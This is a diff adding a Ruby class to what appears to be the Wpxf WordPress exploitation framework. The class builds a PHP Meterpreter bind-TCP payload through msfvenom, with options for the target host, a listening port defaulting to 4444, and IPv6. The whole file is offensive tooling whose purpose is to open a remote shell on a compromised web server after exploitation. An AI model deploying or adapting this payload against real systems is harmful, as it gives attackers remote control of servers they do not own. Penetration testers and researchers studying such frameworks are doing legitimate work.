@@ -1,0 +1,61 @@
+module Wpxf::Payloads
+  # A Meterpreter bind TCP payload generator.
+  class MeterpreterBindTcp < Wpxf::Payload
+    include Wpxf
+    include Wpxf::Options
+    include Wpxf::Payloads::MsfVenomHelper
+
+    def initialize
+      super
+
+      register_msfvenom_options
+      register_options([
+        StringOption.new(
+          name: 'rhost',
+          required: true,
+          desc: 'The address of the host listening for a connection'
+        ),
+        PortOption.new(
+          name: 'lport',
+          required: true,
+          default: 4444,
+          desc: 'The port being used to listen for incoming connections'
+        ),
+        BooleanOption.new(
+          name: 'use_ipv6',
+          required: true,
+          default: false,
+          desc: 'Bind to an IPv6 address'
+        )
+      ])
+    end
+
+    def host
+      escape_single_quotes(datastore['rhost'])
+    end
+
+    def lport
+      normalized_option_value('lport')
+    end
+
+    def use_ipv6
+      normalized_option_value('use_ipv6')
+    end
+
+    def raw
+      msfvenom_payload
+    end
+
+    def msfvenom_payload_name
+      if use_ipv6
+        'php/meterpreter/bind_tcp_ipv6'
+      else
+        'php/meterpreter/bind_tcp'
+      end
+    end
+
+    def prepare(mod)
+      generate_msfvenom_payload(mod, msfvenom_payload_name, "RHOST=#{host}", "LPORT=#{lport}")
+    end
+  end
+end
